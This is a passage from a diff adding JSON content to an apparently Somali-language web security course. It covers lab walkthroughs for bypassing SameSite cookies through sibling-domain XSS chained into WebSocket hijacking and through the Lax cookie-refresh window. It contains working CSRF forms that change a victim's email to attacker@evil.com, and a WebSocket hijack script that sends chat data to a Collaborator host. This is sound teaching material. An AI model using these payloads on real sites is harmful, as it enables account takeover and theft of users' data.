+      "    document.location = \"https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker%40evil.com%26submit=1\";",
+      "</script>"
+     ],
+     "id": "part-7-b119"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 6: Deliver",
+     "text": "Tallaabo 6: Deliver",
+     "id": "part-7-b120"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel email-ka.",
+       "text": "Beddel email-ka.",
+       "level": 0
+      },
+      {
+       "html": "Store, Deliver.",
+       "text": "Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b121"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 11: SameSite Strict via Sibling Domain (CSWSH) ",
+     "text": "Lab-ka 11: SameSite Strict via Sibling Domain (CSWSH)",
+     "id": "part-7-b122",
+     "slug": "lab-ka-11-samesite-strict-via-sibling-domain-cswsh"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay SameSite=Strict. Laakiin wuxuu leeyahay sibling domain (<code>cms-...</code>) oo leh XSS. Attacker wuxuu u isticmaalaa XSS-ka si uu CSWSH uga sameeyo main domain-ka.",
+     "text": "Lab-kan wuxuu leeyahay SameSite=Strict. Laakiin wuxuu leeyahay sibling domain (cms-...) oo leh XSS. Attacker wuxuu u isticmaalaa XSS-ka si uu CSWSH uga sameeyo main domain-ka.",
+     "id": "part-7-b123"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu ku barayaa in SameSite=Strict aanu ilaalin haddii sibling domain jiro. Wuxuu ku barayaa in \"site\" uu yahay mid ka weyn \"origin\".",
+     "text": "Lab-kan wuxuu ku barayaa in SameSite=Strict aanu ilaalin haddii sibling domain jiro. Wuxuu ku barayaa in \"site\" uu yahay mid ka weyn \"origin\".",
+     "id": "part-7-b124"
+    },
+    {
+     "type": "para",
+     "html": "Sibling domain waa domain oo wadaaga hal site. Tusaale:",
+     "text": "Sibling domain waa domain oo wadaaga hal site. Tusaale:",
+     "id": "part-7-b125"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "example.com",
+      "cms.example.com"
+     ],
+     "id": "part-7-b126"
+    },
+    {
+     "type": "para",
+     "html": "Dhibaatada: Sibling domain wuxuu noqon karaa bridge. Haddii attacker uu XSS ku helo sibling domain-ka, wuxuu maamulaa browser-ka victim. Wuxuu sameeyaa request u socda main domain-ka. Waa same-site. Cookie-ga waa la diraa.",
+     "text": "Dhibaatada: Sibling domain wuxuu noqon karaa bridge. Haddii attacker uu XSS ku helo sibling domain-ka, wuxuu maamulaa browser-ka victim. Wuxuu sameeyaa request u socda main domain-ka. Waa same-site. Cookie-ga waa la diraa.",
+     "id": "part-7-b127"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "XSS on Sibling Domain",
+     "text": "XSS on Sibling Domain",
+     "id": "part-7-b128",
+     "slug": "xss-on-sibling-domain"
+    },
+    {
+     "type": "para",
+     "html": "XSS waa code execution. XSS on sibling domain wuxuu u ogolaataa attacker inuu maamulo browser-ka victim gudaha site-ka. Wuxuu sameeyaa request kasta. Wuxuu akhriyaa response kasta.",
+     "text": "XSS waa code execution. XSS on sibling domain wuxuu u ogolaataa attacker inuu maamulo browser-ka victim gudaha site-ka. Wuxuu sameeyaa request kasta. Wuxuu akhriyaa response kasta.",
+     "id": "part-7-b129"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-7-b130"
+    },
+    {
+     "type": "code",
+     "lang": "javascript",
+     "lines": [
+      "var ws = new WebSocket('wss://target.com/chat');",
+      "ws.onopen = function() { ws.send(\"READY\"); };",
+      "ws.onmessage = function(event) {",
+      "    fetch('https://collaborator.oastify.com', {method: 'POST', body: event.data});",
+      "};"
+     ],
+     "id": "part-7-b131"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "CSWSH",
+     "text": "CSWSH",
+     "id": "part-7-b132",
+     "slug": "cswsh"
+    },
+    {
+     "type": "para",
+     "html": "CSWSH waa Cross-Site WebSocket Hijacking. Waa CSRF nooca WebSocket.",
+     "text": "CSWSH waa Cross-Site WebSocket Hijacking. Waa CSRF nooca WebSocket.",
+     "id": "part-7-b133"
+    },
+    {
+     "type": "para",
+     "html": "CSWSH wuxuu u baahan yahay WebSocket handshake. Waa GET. Waa cookie-based. Ma leh CSRF token.",
+     "text": "CSWSH wuxuu u baahan yahay WebSocket handshake. Waa GET. Waa cookie-based. Ma leh CSRF token.",
+     "id": "part-7-b134"
+    },
+    {
+     "type": "para",
+     "html": "Dhibaatada: CSWSH wuxuu u baahan yahay same-site. Haddii attacker uu XSS ku helo sibling domain, wuxuu sameeyaa CSWSH. Waa same-site. Cookie-ga waa la diraa.",
+     "text": "Dhibaatada: CSWSH wuxuu u baahan yahay same-site. Haddii attacker uu XSS ku helo sibling domain, wuxuu sameeyaa CSWSH. Waa same-site. Cookie-ga waa la diraa.",
+     "id": "part-7-b135"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "7.7.5 Sida Loo Tijaabiyo",
+     "text": "7.7.5 Sida Loo Tijaabiyo",
+     "id": "part-7-b136",
+     "slug": "7-7-5-sida-loo-tijaabiyo"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login wiener",
+     "text": "Tallaabo 1: Login wiener",
+     "id": "part-7-b137"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Eeg <code>Set-Cookie</code>: <code>SameSite=Strict</code>.",
+       "text": "Eeg Set-Cookie: SameSite=Strict.",
+       "level": 0
+      },
+      {
+       "html": "Eeg WebSocket handshake: ma jiro CSRF token.",
+       "text": "Eeg WebSocket handshake: ma jiro CSRF token.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b138"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi CSWSH toos ah",
+     "text": "Tallaabo 2: Tijaabi CSWSH toos ah",
+     "id": "part-7-b139"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Exploit server ku dir CSWSH payload.",
+       "text": "Exploit server ku dir CSWSH payload.",
+       "level": 0
+      },
+      {
+       "html": "Collaborator wuxuu helaa interaction.",
+       "text": "Collaborator wuxuu helaa interaction.",
+       "level": 0
+      },
+      {
+       "html": "Laakiin chat history waa mid cusub (cookie lama dirin).",
+       "text": "Laakiin chat history waa mid cusub (cookie lama dirin).",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b140"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Hel sibling domain",
+     "text": "Tallaabo 3: Hel sibling domain",
+     "id": "part-7-b141"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Burp &gt; responses-ka resources-ka &gt; <code>Access-Control-Allow-Origin: cms-...</code>.",
+       "text": "Burp > responses-ka resources-ka > Access-Control-Allow-Origin: cms-....",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b142"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: XSS on sibling domain",
+     "text": "Tallaabo 4: XSS on sibling domain",
+     "id": "part-7-b143"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Booqo <code>cms-...</code>.",
+       "text": "Booqo cms-....",
+       "level": 0
+      },
+      {
+       "html": "Login <code>username=&lt;script&gt;</code><code>alert(</code><code>1)&lt;/script&gt;</code>.",
+       "text": "Login username=<script>alert(1)</script>.",
+       "level": 0
+      },
+      {
+       "html": "Alert(1) wuu kiciyaa.",
+       "text": "Alert(1) wuu kiciyaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b144"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Samee exploit chain",
+     "text": "Tallaabo 5: Samee exploit chain",
+     "id": "part-7-b145"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<script>",
+      "    document.location = \"https://cms-LAB-ID.web-security-academy.net/login?username=URL-ENCODED-CSWSH&password=anything\";",
+      "</script>"
+     ],
+     "id": "part-7-b146"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 6: Deliver",
+     "text": "Tallaabo 6: Deliver",
+     "id": "part-7-b147"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Store, Deliver.",
+       "text": "Store, Deliver.",
+       "level": 0
+      },
+      {
+       "html": "Collaborator &gt; Poll now.",
+       "text": "Collaborator > Poll now.",
+       "level": 0
+      },
+      {
+       "html": "Chat history wuu soo baxaa.",
+       "text": "Chat history wuu soo baxaa.",
+       "level": 0
+      },
+      {
+       "html": "Ka hel username iyo password victim-ka.",
+       "text": "Ka hel username iyo password victim-ka.",
+       "level": 0
+      },
+      {
+       "html": "Login victim-ka → lab solved.",
+       "text": "Login victim-ka → lab solved.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b148"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 12: SameSite Lax via Cookie Refresh ",
+     "text": "Lab-ka 12: SameSite Lax via Cookie Refresh",
+     "id": "part-7-b149",
+     "slug": "lab-ka-12-samesite-lax-via-cookie-refresh"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay SameSite=Lax. Laakiin SameSite=Lax wuxuu leeyahay 2-minute window — haddii cookie la cusboonaysiiyo, wuxuu u dhaqmaa sida None.",
+     "text": "Lab-kan wuxuu leeyahay SameSite=Lax. Laakiin SameSite=Lax wuxuu leeyahay 2-minute window — haddii cookie la cusboonaysiiyo, wuxuu u dhaqmaa sida None.",
+     "id": "part-7-b150"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Cookie Refresh",
+     "text": "Cookie Refresh",
+     "id": "part-7-b151",
+     "slug": "cookie-refresh"
+    },
+    {
+     "type": "para",
+     "html": "Cookie refresh waa falsafad. Waa marka cookie-ga la cusboonaysiiyo. Waa marka browser-ku uu helo Set-Cookie cusub.",
+     "text": "Cookie refresh waa falsafad. Waa marka cookie-ga la cusboonaysiiyo. Waa marka browser-ku uu helo Set-Cookie cusub.",
+     "id": "part-7-b152"
+    },
+    {
+     "type": "para",
+     "html": "SameSite=Lax wuxuu leeyahay window. Wuxuu yiraahdaa: \"Haddii cookie-ga la cusboonaysiiyo, wuxuu u dhaqmaa sida None.\" Waa 2-minute window.",
+     "text": "SameSite=Lax wuxuu leeyahay window. Wuxuu yiraahdaa: \"Haddii cookie-ga la cusboonaysiiyo, wuxuu u dhaqmaa sida None.\" Waa 2-minute window.",
+     "id": "part-7-b153"
+    },
+    {
+     "type": "para",
+     "html": "Dhibaatada: Attacker-ku wuxuu cusboonaysiin karaa cookie-ga. Wuxuu furi karaa window-ka. Wuxuu diraa POST.",
+     "text": "Dhibaatada: Attacker-ku wuxuu cusboonaysiin karaa cookie-ga. Wuxuu furi karaa window-ka. Wuxuu diraa POST.",
+     "id": "part-7-b154"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-7-b155"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<script>",
+      "    // Step 1: Refresh cookie",
+      "    window.open('https://target.com/');",
+      "    ",
+      "    // Step 2: Wait 1 second, then submit",
+      "    setTimeout(function() {",
+      "        document.forms[0].submit();",
+      "    }, 1000);",
+      "</script>",
+      "<form method=\"POST\" action=\"https://target.com/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "</form>"
+     ],
+     "id": "part-7-b156"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "7.8.4 Sida Loo Tijaabiyo",
+     "text": "7.8.4 Sida Loo Tijaabiyo",
+     "id": "part-7-b157",
+     "slug": "7-8-4-sida-loo-tijaabiyo"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login wiener",
+     "text": "Tallaabo 1: Login wiener",
+     "id": "part-7-b158"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Eeg <code>Set-Cookie</code>: <code>SameSite=Lax</code>.",
+       "text": "Eeg Set-Cookie: SameSite=Lax.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b159"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi POST",
+     "text": "Tallaabo 2: Tijaabi POST",
+     "id": "part-7-b160"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Repeater ku dir POST request.",
+       "text": "Repeater ku dir POST request.",
+       "level": 0
+      },
+      {
+       "html": "Riix Send.",
+       "text": "Riix Send.",
+       "level": 0
+      },
+      {
+       "html": "Haddii la diido → SameSite=Lax wuu shaqeynayaa.",
+       "text": "Haddii la diido → SameSite=Lax wuu shaqeynayaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b161"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Tijaabi cookie refresh",
+     "text": "Tallaabo 3: Tijaabi cookie refresh",
+     "id": "part-7-b162"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Furi <code>https://target.com/</code> (bog cusub).",
+       "text": "Furi https://target.com/ (bog cusub).",
+       "level": 0
+      },
+      {
+       "html": "Sug 1 ilbiriqsi.",
+       "text": "Sug 1 ilbiriqsi.",
+       "level": 0
+      },
+      {
+       "html": "Dir POST request.",
+       "text": "Dir POST request.",
+       "level": 0
+      },
+      {
+       "html": "Haddii la aqbalo → waa vulnerable.",
+       "text": "Haddii la aqbalo → waa vulnerable.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b163"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Samee exploit",
+     "text": "Tallaabo 4: Samee exploit",
+     "id": "part-7-b164"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<script>",
+      "    window.open('https://LAB-ID.web-security-academy.net/');",
+      "    setTimeout(function() {",
+      "        document.forms[0].submit();",
+      "    }, 1000);",
+      "</script>",
+      "<form method=\"POST\" action=\"https://LAB-ID.web-security-academy.net/my-account/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "</form>"
+     ],
+     "id": "part-7-b165"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Deliver",
+     "text": "Tallaabo 5: Deliver",
+     "id": "part-7-b166"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel email-ka.",
+       "text": "Beddel email-ka.",
+       "level": 0
+      },
+      {
+       "html": "Store, Deliver.",
+       "text": "Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b167"
+    },
+    {
+     "type": "para",
+     "html": ".",
+     "text": ".",
+     "id": "part-7-b168"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "7.9 Falsafadda SameSite: Soo Koobid",
+     "text": "7.9 Falsafadda SameSite: Soo Koobid",
+     "id": "part-7-b169",
+     "slug": "7-9-falsafadda-samesite-soo-koobid"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "7.9.1 Saddexda Qiime",
+     "text": "7.9.1 Saddexda Qiime",
+     "id": "part-7-b170",
+     "slug": "7-9-1-saddexda-qiime"
+    },
+    {
+     "type": "table",
+     "rows": [
+      [
+       "Qiime",
+       "Cross-site GET",
+       "Cross-site POST",
+       "Subresource",
+       "Bypass"
+      ],
+      [
+       "Strict",
+       "❌",
+       "❌",
+       "❌",
+       "Client-side redirect, sibling domain"
+      ],
+      [
+       "Lax",
+       "✅ (top-level)",
+       "❌",
+       "❌",
+       "Method override, cookie refresh"
+      ],
+      [
+       "None",
+       "✅",
+       "✅",
+       "✅",
+       "CSRF waa mid fudud"
+      ]
+     ],
+     "id": "part-7-b171"
+    },
+    {
+     "type": "para",
+     "html": "SameSite waa defense-in-depth. Waa layered. Waa bypassable. Waa in la isticmaalaa CSRF token iyo Origin validation.",
+     "text": "SameSite waa defense-in-depth. Waa layered. Waa bypassable. Waa in la isticmaalaa CSRF token iyo Origin validation.",
+     "id": "part-7-b172"
+    },
+    {
+     "type": "para",
+     "html": "SameSite wuxuu ku salaysan yahay \"site\". Laakiin \"site\" ma aha \"origin\". Waa mid ka weyn. Waa mid ka duwan.",
+     "text": "SameSite wuxuu ku salaysan yahay \"site\". Laakiin \"site\" ma aha \"origin\". Waa mid ka weyn. Waa mid ka duwan.",
+     "id": "part-7-b173"
+    }
+   ],
+   "id": "part-7",
+   "index": 7
+  }
+ ]
+}
